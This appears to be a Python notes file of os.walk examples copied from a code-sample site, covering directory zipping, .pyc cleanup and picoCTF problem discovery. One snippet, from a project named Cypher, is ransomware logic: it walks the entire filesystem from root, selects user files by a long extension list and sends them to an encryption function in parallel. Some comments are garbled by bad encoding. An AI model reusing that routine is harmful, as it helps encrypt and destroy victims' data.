
#https://www.programcreek.com/python/example/60/os.walk

'''

def zipdir(archivename, basedir):
    #Zip directory, from J.F. Sebastian http://stackoverflow.com/
    assert os.path.isdir(basedir)
    with closing(ZipFile(archivename, "w", ZIP_DEFLATED)) as z:
        for root, dirs, files in os.walk(basedir):
            #NOTE: ignore empty directories
            for fn in files:
                if fn[-4:]!='.zip':
                    absfn = os.path.join(root, fn)
                    zfn = absfn[len(basedir)+len(os.sep):] #XXX: relative path
                    z.write(absfn, zfn)

# ================ Inventory input data and create data structure =================



'''

'''
#Project: Cypher   Author: NullArray   File: cyphermain.py    (GNU General Public License v3.0) View Source Project	9 votes	vote downvote up
def select_files():
    
    ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe", 
           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h", 
	   ".gif", ".txt", ".py", ".pyc", ".jar", ".sql", ".bundle",
	   ".sqlite3", ".html", ".php", ".log", ".bak", ".deb"]
           
    files_to_enc = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(tuple(ext)):
                files_to_enc.append(os.path.join(root, file))

    # Parallelize execution of encryption function over four subprocesses
    pool = Pool(processes=4)
    pool.map(single_arg_encrypt_file, files_to_enc) 
'''

'''
#Project: Starfish   Author: BillWang139967   File: clear_pyc.py    (GNU General Public License v3.0) View Source Project	6 votes	vote downvote up
def clearpyc(root, patterns='*',single_level=False, yield_folders=False):
	"""
	root: ??¼
	patterns ???????
	single_level: ???¼??
	yield_folders: ??¼??
	"""
	patterns = patterns.split(';')
	for path, subdirs, files in os.walk(root):
		if yield_folders:
			files.extend(subdirs)
			files.sort()
		for name in files:
			for pattern in patterns:
				if fnmatch.fnmatch(name, pattern.strip()):# ?pattern???
					yield os.path.join(path, name)
		if single_level:
			break 

'''


'''
#Project: picoCTF   Author: picoCTF   File: package.py    (MIT License) View Source Project	6 votes	vote downvote up
def find_problems(problem_path):
    """
    Find all problems that exist under the given root.
    We consider any directory with a problem.json to be an intended problem directory.

    Args:
        problem_path: the problem directory
    Returns:
        A list of problem paths returned from get_problem.
    """

    problem_paths = []

    for root, _, files in os.walk(problem_path):
        if "problem.json" in files and "__staging" not in root:
            problem_paths.append(root)

    return problem_paths 


'''

'''
#Project: picoCTF   Author: picoCTF   File: problem.py    (MIT License) View Source Project	6 votes	vote downvote up
def files_from_directory(directory, recurse=True, permissions=0o664):
    """
    Returns a list of File objects for every file in a directory. Can recurse optionally.

    Args:
        directory: The directory to add files from
        recurse: Whether or not to recursively add files. Defaults to true
        permissions: The default permissions for the files. Defaults to 0o664.
    """

    result = []

    for root, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            result.append(File(join(root, filename), permissions))
        if not recurse:
            break

    return result 

'''




